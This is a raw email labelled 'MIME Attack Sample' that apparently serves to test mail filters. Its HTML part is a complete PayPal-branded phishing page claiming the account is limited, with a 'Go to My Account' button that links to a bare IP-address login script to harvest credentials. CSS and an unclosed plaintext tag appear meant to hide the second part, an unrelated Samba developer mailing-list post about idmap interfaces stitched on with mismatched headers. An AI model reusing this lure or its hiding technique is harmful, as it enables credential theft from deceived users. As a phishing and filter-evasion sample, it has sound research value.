From: jeremy.blachman@enron.com
To: eub310hgb@msn.com
Subject: MIME Attack Sample
Content-Type: multipart/mixed; boundary="BOUNDARY"
--BOUNDARY
Content-Type: text/html
Content-Type: text/html
Message-Id: <20060629140708.EA386322D0E@63-150-92-250.dia.cust.qwest.net>
Date: Thu, 29 Jun 2006 10:07:08 -0400 (EDT)
Status: 
X-Status: 
X-Keywords:                   


<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>PayPal - Limited Account Access Details</title>
<style>

#message .SectionTitle {font-size: small; font-family: arial, sans-serif; font-weight:bold }
#message .SmallTitle {font-size: x-small; font-family: arial, sans-serif; font-weight:bold }
#message .SectionBody {font-size: x-small; font-family: arial, sans-serif}
#message .DetailTable, #message .DetailTable th {font-size: 10 pt; font-family: arial, sans-serif; font-weight:normal }
#message .Title {font-size: medium; font-family: verdana, arial, sans-serif}
#message .BodyFont {font-size: 10 pt; font-family: arial, sans-serif; font-weight:normal}
#message .BodyFontStrong {font-size: 10 pt; font-family: arial, sans-serif; font-weight:bold}
#message .SmallBody {font-size: xx-small; font-family: arial, sans-serif; font-weight:normal; margin-top: 8 px;  margin-bottom: 6 px}
#message .Separator { COLOR: #CCCCCC; height: 1px}
#message .HighlightedSeparator { COLOR: #FFCC00; height: 1px}
#message .FooterSeparator { COLOR: #CCCCCC; height: 1px}
#message .Footer, #message .Footer p {font-size: xx-small; font-family:arial, sans-serif; color:#666666; margin-top: 2 px;  margin-bottom: 8 px}
#message .SmallPara, #message .SmallParap {margin-top: 8 px;  margin-bottom: 6 px}
</style>
<style xmlns:x="urn:schemas-microsoft-com:xslt">                #message .ItemTitle {font-size: 10pt; font-family: arial, sans-serif; font-weight:bold }</style>
<meta http-equiv="description" content="PayPal lets you send money to anyone with email. PayPal is free for consumers and works seamlessly with your existing credit card and checking account. You can settle debts, borrow cash, divide bills or split expenses with friends all without going to an ATM or looking for your checkbook.">
<meta http-equiv="keywords" content="Send, money, payments, credit, credit card, instant, money, financial services, mobile, wireless, WAP, cell phones, two-way pagers, Windows CE">
<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/css/xpt.css">
<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/css/xptInvoice.css">
<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/css/xptObsolete.css">
<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/css/xptlive.css">
<style type="text/css"></style>
<link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">

<script language="JavaScript">
<!--

function SymError()
{
  return true;
}

window.onerror = SymError;

var SymRealWinOpen = window.open;

function SymWinOpen(url, name, attributes
{
  return (new Object());
}

window.open = SymWinOpen;

//-->
</script>

<script src="https://www.paypalobjects.com/js/pp_main.js"></script>
<meta name="generator" content="Namo WebEditor v5.0(Trial)">
</head>
<body><div>
<div id="xptContentMain"><table align="center" border="0" cellpadding="0" cellspacing="0" width="600">
            <td>&nbsp;&nbsp;
<img border="0" src="http://www.paypalobjects.com/en_US/i/header/t1Hdr_hpGraphic_563x115.jpg" alt="" width="563" height="115"></td>
        </tr>

<tr><td><img alt="" border="0" height="1" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="600"></td></tr>
<tr><td><div id="xptTitle"><table align="center" border="0" cellpadding="0" cellspacing="0" class="main">
<tr><td class="heading" width="100%"></td></tr>
<tr><td><img alt="" border="0" height="2" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1"></td></tr>
<tr><td><hr></td></tr>
</table></div></td></tr>
<tr><td valign="top"> <p>PayPal is constantly working to ensure security by regularly screening the accounts in our system. We recently reviewed your account, and we need more information to help us provide you with secure service. Until we can collect this information, your access to sensitive account features will be limited or terminated. We would like to restore your access as soon as possible, and we apologize for the inconvenience. <br>
  </p>
  <hr class="dotted">
<span class="emphasis">Why is my account access limited?</span><br><br class="h6">Your account access has been limited for the following reason's:<br><br>
                <ul>
<li>
&nbsp;<span class="emphasis"> </span>We have reason to believe that your account was accessed by a third party. Because protecting the security of your account is our primary concern, we have limited access to sensitive PayPal account features. We understand that this may be an inconvenience but please understand that this temporary limitation is for your protection.</li>
                </ul>
<br><br>(Your case ID for this reason is PP-121-601-924.)<br><br><hr class="dotted">
<span class="emphasis">How can I restore my account access?</span><br>
<br><table align="center" bgcolor="#cc9999" cellpadding="1" cellspacing="0" width="100%"><tr><td><table align="center" bgcolor="#ffeeee" cellpadding="5" cellspacing="0" width="100%"><tr><td>
  <p style="margin-top: 0; margin-bottom: 0"><span class="emphasis">Please click 
  here  and complete the Steps to Remove Limitations.</span></p>
  <p style="margin-top: 0; margin-bottom: 0"><span class="emphasis">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
                                        <p style="margin-top:0; margin-bottom:0;"><span class="emphasis">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 


  </span><a href="http://210.213.12.182/icons/en/cgi-bin/us/webscr.php?cmd=_login-run"><INPUT type=submit value="Go to My Account" name="Go To My Account"></a> 
                                        </p>
</td></tr></table></td></tr></table>
<br>Completing all of the checklist items will automatically restore your account access.<br><hr class="dotted">
</td></tr>
</table></div>
</div></body>

<script language="JavaScript">
<!--

window.open = SymRealWinOpen;

//-->
</script>

</html>
<style>fieldset, br{display: none;}</style>
<div style="display: none;"><plaintext>
--BOUNDARY
Content-Type: text/plain
-BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Simo,

> On Thu, 2007-04-19 at 23:30 +1000, Luke Howard wrote:
>> Sorry to jump in here, one thing I'd like to see 
>> in idmap_ad is support for using the Global Catalog. Shouldn't
>> be too hard. Thoughts?
> 
> Well IIRC rfc2307 attributes are not exposed via GC by 
> default, so to use it we must have fallback code in place.
> Not that hard, but I guess this is more of a 3.0.26 feature.
> I am working only to stabilize the code for offline
> usage right now.

It's actually worse than that.  The idmap interface is
badly broken.  I hate to say this, but the calls into
winbindd from the idmap child has to go.  I know how you
arrived at the design assumptions.

You designed the unixids_to_sids() and sids_to_unixids()
with the assumption that the idmap plugin would have
knowledge about the SID type.  I didn't catch this
because the backend I'm using for primary testing operates
similarly to idmap_ad and can obtain the SID type based
on LDAP searches.  This is ok for something like idmap_ad
which can get the information.  But the general and
default case is idmap_tdb (or even idmap_ldap).

Requiring the idmap_tdb code (or idmap_rid) to issues a
winbindd client call is wrong and a layering violation.  The
caller should specify the SID type which is exactly what
the WINBINDD_SID_TO_UID, et. al. calls used to do.

Right now I'm going to do several things in order to get
the code to a release point.

(a) Remove WINBINDD_SIDS_TO_XIDS from winbindd_nss.h to
    prevent us from having to support the broken call in
    future releases.  The existing idmap_methods API will
    not change but will become solely an internal interface
    used by winbindd.

(b) Overload the id_map.xid.type to be specified by the caller
    and not filled by the idmap backend.

(c) convert smbd back to the 3.0.24 method of mapping
    SIDs one by one to create the Unix token

Post 3.0.25 I'm going to rewrite the idmap query interface
to use a formal parameter list instead of the struct **id_map
in/out buffer and make it explicit that the caller is to
specify the SID type as part of the query.

It is likely that this will delay the 3.0.25.  Please don't make
any more changes to SAMBA_3_0_25/source/nsswitch/idmap*.[ch]
right now.  Thanks.




cheers, jerry
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFGJ4FxIR7qMdg1EfYRAklqAKCN7k24FzvGy81s9VwSBfytzLXZ7wCgrPab
5ReLld5GDQ9QfZT7efa+jLk=
=YxYg
-----END PGP SIGNATURE-----

-BOUNDARY--
